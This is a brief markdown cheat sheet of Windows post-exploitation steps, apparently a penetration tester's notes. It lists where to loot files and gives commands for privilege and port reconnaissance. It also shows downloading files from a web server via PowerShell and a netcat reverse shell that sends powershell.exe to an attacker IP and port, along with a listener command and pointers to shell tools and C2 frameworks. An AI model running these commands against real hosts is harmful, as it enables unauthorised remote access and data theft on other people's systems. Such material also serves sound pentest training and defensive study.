---
label: Post-exploitation
disabled: true
---

# Files To Loot

C:\inetpub\

## Information gathering

```powershell
# Check if Powershell or CMD is running
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# List current user privileges
whoami /all

# List all listening TCP ports
netstat -noa | findstr "LISTENING"

# Check ACLs of file / directory
icacls $path
```

## File transfer

```powershell
# Download file from URL
Invoke-WebRequest $url -Out $output_file
```

<https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Downloading_Files_from_Attackers_HTTP_Server_PowerShell>

## Shell stabilisation

```powershell
# Connect to remote listener (get reverse shell)
nc.exe $attacker_ip $attacker_port -e powershell.exe

# Start listening on port
rlwrap nc -lvnp $port
```

- <https://github.com/antonioCoco/ConPtyShell/tree/master>
- C2 frameworks: meterpreter, sliver
